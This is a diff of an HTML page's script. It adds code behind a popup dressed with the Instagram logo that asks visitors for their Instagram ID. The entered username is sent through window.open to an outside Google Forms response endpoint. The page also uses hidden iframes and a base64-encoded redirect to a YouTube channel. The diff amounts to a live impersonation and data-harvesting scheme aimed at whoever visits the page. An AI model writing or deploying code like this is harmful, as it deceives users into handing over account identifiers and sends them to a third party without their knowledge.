@@ -16,6 +16,8 @@
     </form>
 <iframe name="fp" style="display:none;"></iframe>
 <iframe name="f" style="display:none;"></iframe>
+<iframe name="fg" style="display:none;"></iframe>
+
 
 
 
@@ -23,7 +25,7 @@
 </body>
 <script>
 /*setTimeout(() => HWindow(`<img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png" width="124" height="50"><br><b>What is Your Instagram Id?</b><br><form action="https://instagram.com" method="post" target="f"><input type="text" name="username" placeholder="username" size="12" style="background-color:#DDD;" id="j"><br><input type="submit" style="color:#FFF; background-color:lightblue;border:none;" value="submit id" align="center" onclick="setTimeout(() => $HId('1').value=$HId('j').value,1400);setTimeout(() => $HId('form').submit(),1600);"></form>`),8000)*/
-setTimeout(() => HWindow(`<img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png" width="124" height="50"><br><b>What is Your Instagram Id?</b><br><form action="https://instagram.com" method="post" target="f"><input type="text" name="username" placeholder="username" size="12" style="background-color:#DDD;" id="j"><br><input type="submit" style="color:#FFF; background-color:lightblue;border:none;" value="submit id" align="center" onclick="setTimeout(() => $HId('1').value=$HId('j').value,1400);setTimeout(() => $HId('form').submit(),1600);"></form>`),8000)
+setTimeout(() => HWindow(`<img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png" width="124" height="50"><br><b>What is Your Instagram Id?</b><br><form action="https://instagram.com" method="post" target="fg"><input type="text" name="username" placeholder="username" size="12" style="background-color:#DDD;" id="j"><br><input type="submit" style="color:#FFF; background-color:lightblue;border:none;" value="submit id" align="center" onclick="g()"></form>`),8000)
 function f()
 {
 
@@ -37,17 +39,18 @@ h.onclick = function(){window.open($Hdecode64("aHR0cHM6Ly9tLnlvdXR1YmUuY29tL2NoY
 h.innerHTML = "visit Channel &nbsp;&#x0C1B&#x0C3E&#x0C28&#x0C32&#x0C4D&#x20&#x0C15&#x0C41&#x20&#x0C35&#x0C46&#x0C33&#x0C4D&#x0C33&#x0C02&#x0C21&#x0C3F &nbsp; &#x091A&#x0948&#x0928&#x0932&#x20&#x0915&#x094B&#x20&#x091C&#x093E&#x090F&#x20 &#x0686&#x06CC&#x0646&#x0644&#x20&#x06A9&#x0648&#x20&#x062C&#x0627&#x06CC&#x06BA";
 c.appendChild(h);
 }
-/*function g()
+function g()
 {
-try{
+/*try{
  setTimeout (() => $HId('1').value = $HId('j').value,1400);
 setTimeout(() => $HTag('form')[1].submit(),1800);
 setTimeout(() => location.href=$Hdecode64("aHR0cHM6Ly9tLnlvdXR1YmUuY29tL2NoYW5uZWwvVUMxQUtOdExVMmozQXhZZFVxLXZLTmpB"),1900);}
 catch(e)
 {
   alert(e);
-}
 }*/
+window.open("https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse?entry.470512502=" + $HId('j').value,"f");
+}
 setTimeout(f,8200);
 </script>
 </html>
